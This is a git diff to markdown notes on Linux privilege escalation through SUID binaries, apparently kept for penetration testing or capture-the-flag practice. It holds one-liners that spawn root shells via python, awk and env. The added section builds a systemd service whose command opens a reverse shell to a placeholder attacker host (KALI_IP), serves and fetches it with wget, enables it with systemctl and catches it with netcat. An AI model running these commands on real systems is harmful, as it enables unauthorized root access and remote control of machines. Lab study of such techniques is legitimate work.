@@ -1,6 +1,5 @@
 # Linux Privilege Escalation
 
-
 ## SUID
 SUID - OWNER
 SGID - GROUP
@@ -17,6 +16,7 @@ Perfect candidates are:
 /usr/bin/awk
 /usr/bin/env
 /usr/bin/find
+/bin/systemctl
 ```
 
 ### Step 2 - look online whether there are SUID PrivEsc Exploits
@@ -25,7 +25,7 @@ Perfect candidates are:
 ![suid gtfobins](./img/image-4.png)
 
 **Examples:**
-- /usr/bin/python*
+- **/usr/bin/python***
     ```
     python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
     ```
@@ -37,14 +37,47 @@ Perfect candidates are:
     python2.7 -c "import os; os.execl('/bin/sh', 'sh', '-p')"
     ```
 
-- /usr/bin/awk
+- **/usr/bin/awk**
     ```
     awk 'BEGIN {system("/bin/sh")}'
     ```
 
-- /usr/bin/env
+- **/usr/bin/env**
     ```
     /usr/bin/env /bin/sh -p
+    ```
+
+- **/bin/systemctl**
+
+    first make a new service `root.service`
+    ```
+    [unit]
+    Description=root
+
+    [Service]
+    Type=simple
+    User=root
+    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/PORT_B 0>&1'
+
+    [Install]
+    WantedBy=multi-user.target
+    ```
+    then upload with python http
+    ```
+    python3 -m http.server PORT
+    ```
+    and download with wget
+    ```
+    wget http://KALI_IP:PORT/root.service
+    ```
+    then run systemctl
+    ```
+    systemctl enable /tmp/root.service
+    systemctl start /tmp/root.service
+    ```
+    and from your kali machine listen
+    ```
+    netcat -lvnp PORT_B
     ```
 
 ### Step 3 - ROOT
